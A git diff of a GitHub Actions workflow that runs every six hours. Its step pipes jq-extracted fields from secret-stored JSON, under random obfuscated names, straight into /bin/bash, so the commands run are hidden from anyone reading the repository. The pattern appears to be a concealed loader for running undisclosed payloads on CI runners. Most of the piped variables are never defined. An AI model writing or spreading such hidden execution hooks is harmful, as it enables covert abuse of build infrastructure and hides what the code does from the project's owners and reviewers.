@@ -1,9 +1,11 @@
 name: houryourself
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 4/6 * * *'
-jobs:  # 17320
+    - cron: '37 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,17 +13,23 @@ jobs:  # 17320
       - uses: actions/checkout@v4
       - name: houryourself
         env:
-          xxaqi51892: ${{ secrets.xxaqi51892 }}
+          qwnk383: ${{ secrets.qwnk383 }}
         run: |
-          echo $xxaqi51892 | jq -r .ace8280 | /bin/bash
-          echo $kr57887 | jq -r .toc0 | /bin/bash
-          echo $cnynz46694 | jq -r .ljh5113 | /bin/bash
-          echo $xvqr641 | jq -r .pzqr0196 | /bin/bash
-          echo $cx02 | jq -r .vc0 | /bin/bash
-          echo $rif2 | jq -r .eoi57 | /bin/bash
-          echo $drzf9664 | jq -r .xvnkw485 | /bin/bash
-          echo $gq8362 | jq -r .ho9692 | /bin/bash
-          echo $e14 | jq -r .yaah13 | /bin/bash
-          echo $srprl024 | jq -r .cql1973 | /bin/bash
-          echo $h51 | jq -r .sxqo29 | /bin/bash
+          echo $qwnk383 | jq -r .vnhkq311 | /bin/bash
+          echo $gcotg876 | jq -r .gqruq3 | /bin/bash
+          echo $v1177 | jq -r .hmlxo6634 | /bin/bash
+          echo $sdyc08306 | jq -r .sytx6 | /bin/bash
+          echo $jvgfb08 | jq -r .x0893 | /bin/bash
+          echo $jsul344 | jq -r .qaoum08 | /bin/bash
+          echo $dkbts2 | jq -r .jl68 | /bin/bash
+          echo $dnw7119 | jq -r .uj1756 | /bin/bash
+          echo $kfl287 | jq -r .tkoza3 | /bin/bash
+          echo $tqt7 | jq -r .caji2274 | /bin/bash
+          echo $q50362 | jq -r .pcjrn720 | /bin/bash
+          echo $h9 | jq -r .ocqim7 | /bin/bash
+          echo $wfhz9372 | jq -r .h0613 | /bin/bash
+          echo $c8690 | jq -r .jeg95693 | /bin/bash
+          echo $aidgm892 | jq -r .zxqid38973 | /bin/bash
+          echo $rdo2582 | jq -r .cq50 | /bin/bash
+          echo $mpp56600 | jq -r .xiuby406 | /bin/bash
 
